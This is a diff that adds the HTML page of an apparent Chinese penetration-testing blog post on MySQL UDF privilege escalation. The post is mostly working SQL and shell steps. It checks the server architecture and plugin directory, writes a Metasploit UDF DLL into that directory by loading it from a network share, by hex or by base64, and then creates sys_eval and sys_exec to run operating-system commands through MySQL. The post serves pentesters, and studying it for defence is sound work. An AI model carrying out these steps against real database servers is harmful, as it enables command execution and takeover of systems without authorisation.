@@ -1,0 +1,405 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>MySql UDF提权注意事项 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="[mysql-udf-exploitation]https://osandamalith.com/2018/02/11/mysql-udf-exploitationMSF的dll: https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
+
+0x01 准备工作先检查运行的mysql结构:
+select @@version_compile_os, @@version_compile_machine;
+show variables like &amp;#39;%compile%&amp;#39;;
+
+结果如下:
+MySQL [(none)]&gt; select @@version_compile_os, @@version_compile_machine;
++----------------------+---------------------------+
+| @@version_compile_os | @@version_compile_machine |
++----------------------+---------------------------+
+| Win64                | x86_64                    |
++----------------------+---------------------------+
+MySQL [(none)]&gt; show variables like &#39;%compile%&#39;;
++-------------------------+--------+
+| Variable_name           | Value  |
++-------------------------+--------+
+| version_compile_machine | x86_64 |
+| version_compile_os      | Win64  |
++-------------------------+--------+
+
+在Mysql 5.0.67版本开始，UDF的文件必须放在mysql的插件目录: select @@plugin_dir;
+可以在开启mysql的时候设置plugin的目录:
+指定目录:
+mysqld.exe –plugin-dir&amp;#x3D;C:\\temp\\plugins\\
+
+指定配置文件:
+mysqld.exe --defaults-file&amp;#x3D;C:\\temp\\my.ini
+
+配置文件包括如下内容:
+[mysqld]
+plugin_dir &amp;#x3D; C:\\temp\\plugins\\
+
+老版本的Mysql搜索UDF路径是按照如下的顺序来的:"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="MySql UDF提权注意事项"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> MySql UDF提权注意事项</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+</blockquote>
+<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
+<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
+show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>结果如下:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
++----------------------+---------------------------+
+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
++-------------------------+--------+
+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
++-------------------------+--------+
+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
+<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
++-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
+<p>可以在开启mysql的时候设置plugin的目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">指定目录:
+mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
+
+指定配置文件:
+mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
+
+配置文件包括如下内容:
+[mysqld]
+plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
+<ul>
+<li>@@datadir</li>
+<li>@@basedir\bin</li>
+<li>C:\windows</li>
+<li>C:\windows\system</li>
+<li>C:\windows\system32</li>
+</ul>
+<h3 id="上传UDF的文件"><a href="#上传UDF的文件" class="headerlink" title="上传UDF的文件"></a>上传UDF的文件</h3><h4 id="0x01-网络共享写文件"><a href="#0x01-网络共享写文件" class="headerlink" title="0x01 网络共享写文件"></a>0x01 网络共享写文件</h4><pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="0x02-十六进制"><a href="#0x02-十六进制" class="headerlink" title="0x02 十六进制"></a>0x02 十六进制</h4><pre class="line-numbers language-none"><code class="language-none">xxd -plain &#x2F;tmp&#x2F;udf.dll | tr -d &#39;\n&#39; &gt; &#x2F;tmp&#x2F;dll.hex 转换为16进制
+use mysql;
+set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);
+create table tmp(data LONGBLOB);
+insert into tmp values(&quot;&quot;);
+update tmp set data &#x3D; @a;
+select data from tmp into DUMPFILE &lt;dir&gt;;
+create function sys_eval returns string soname &#39;sys_eval.dll&#39;;
+
+drop table tmp;
+drop function sys_eval; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="0x03-网络共享-16进制"><a href="#0x03-网络共享-16进制" class="headerlink" title="0x03 网络共享+16进制"></a>0x03 网络共享+16进制</h4><pre class="line-numbers language-none"><code class="language-none">load data infile &#39;\\\\192.168.0.19\\network\\udf.hex&#39; 
+into table temp fields terminated by &#39;@OsandaMalith&#39; 
+lines terminated by &#39;@OsandaMalith&#39; (data);
+
+select unhex(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="0x04-base64写入"><a href="#0x04-base64写入" class="headerlink" title="0x04 base64写入"></a>0x04 base64写入</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;先转换为base64;
+select to_base64(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll&#39;)) 
+into dumpfile &#39;&#x2F;tmp&#x2F;udf.b64&#39;;
+
+&#x2F;&#x2F;再写入:
+select from_base64(&quot;TVqQAAMAAAAEAAAAA&quot;) 
+into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;
+
+或者写入到大表里面，再写入到文件:
+select from_base64(data) from temp 
+into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>msf自带的udf提供的几个函数，主要用到的是<code>sys_eval</code>和<code>sys_exec</code>,实测<code>sys_exec</code>会把mysql崩溃，可能创建的时候返回了string，建议使用<code>sys_eval</code>:</p>
+<h4 id="sys-exec"><a href="#sys-exec" class="headerlink" title="sys_exec"></a>sys_exec</h4><pre class="line-numbers language-none"><code class="language-none">创建函数:
+create function sys_exec returns int soname &#39;udf.dll&#39;;
+
+确定是否成功:
+select * from mysql.func where name &#x3D; &#39;sys_exec&#39;;
+
+删除函数:
+drop function sys_exec;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="sys-eval"><a href="#sys-eval" class="headerlink" title="sys_eval"></a>sys_eval</h4><pre class="line-numbers language-none"><code class="language-none">创建函数:
+create function sys_eval returns string soname &#39;udf.dll&#39;;
+
+确定是否成功:
+select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;
+
+删除:
+drop function sys_eval;
+
+使用:
+select sys_eval(&#39;dir&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h4 id="sys-get"><a href="#sys-get" class="headerlink" title="sys_get"></a>sys_get</h4><pre class="line-numbers language-none"><code class="language-none">create function sys_get returns string soname &#39;udf.dll&#39;;
+Drop function sys_get;
+
+&#x2F;&#x2F;获取环境变量
+Select sys_get(&#39;longonserver&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>I noticed that these external UDF functions do not have proper exception handling in the dissembled code. Hence, a slightest mistake while calling these functions will lead the mysqld.exe server to crash. I hope this article might be useful to you while pentesting MySQL.</p>
+</blockquote>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/07/29/mysql-UDF.html" class="leancloud-visitors view" data-flag-title="MySql UDF提权注意事项">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2020/08/28/hide-your-windows-backdoor.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/07/16/Com-Object-Pentest-Note2.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-07-29 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x01-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-article-text">0x01 准备工作</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%8A%E4%BC%A0UDF%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-article-text">上传UDF的文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#0x01-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-article-text">0x01 网络共享写文件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#0x02-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-article-text">0x02 十六进制</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#0x03-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB-16%E8%BF%9B%E5%88%B6"><span class="toc-article-text">0x03 网络共享+16进制</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#0x04-base64%E5%86%99%E5%85%A5"><span class="toc-article-text">0x04 base64写入</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exploit"><span class="toc-article-text">Exploit</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#sys-exec"><span class="toc-article-text">sys_exec</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#sys-eval"><span class="toc-article-text">sys_eval</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#sys-get"><span class="toc-article-text">sys_get</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
